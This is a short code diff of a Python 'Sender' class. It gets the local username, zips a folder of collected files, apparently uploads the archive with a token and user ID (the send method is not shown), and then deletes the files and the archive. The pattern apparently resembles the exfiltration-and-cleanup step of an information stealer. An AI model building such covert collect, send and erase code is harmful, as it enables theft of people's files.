@@ -1,20 +1,25 @@
 import requests
+
+from os import remove
 from shutil import make_archive, rmtree
+
+from getpass import getuser
 
 
 class Sender:
 
-    def __init__(self, user: str, storage_path: str, token: str, user_id: int):
+    def __init__(self, storage_path: str, storage_folder: str, token: str, user_id: int):
 
-        self.user = user
+        self.user = getuser()
         self.storage_path = storage_path
+        self.storage_folder = storage_folder
 
         self.token = token
         self.user_id = user_id
 
     def __create_archive(self):
 
-        make_archive(self.storage_path + f"{self.user}-st", 'zip', self.storage_path + "results")
+        make_archive(self.storage_path + f"{self.user}-st", 'zip', self.storage_path + "files/")
 
     def __send_archive(self):
 
@@ -34,7 +39,8 @@ class Sender:
 
     def __delete_files(self):
 
-        rmtree(self.storage_path)
+        rmtree(self.storage_path + "files/")
+        remove(self.storage_path + f"{self.user}-st.zip")
 
     def run(self):
 
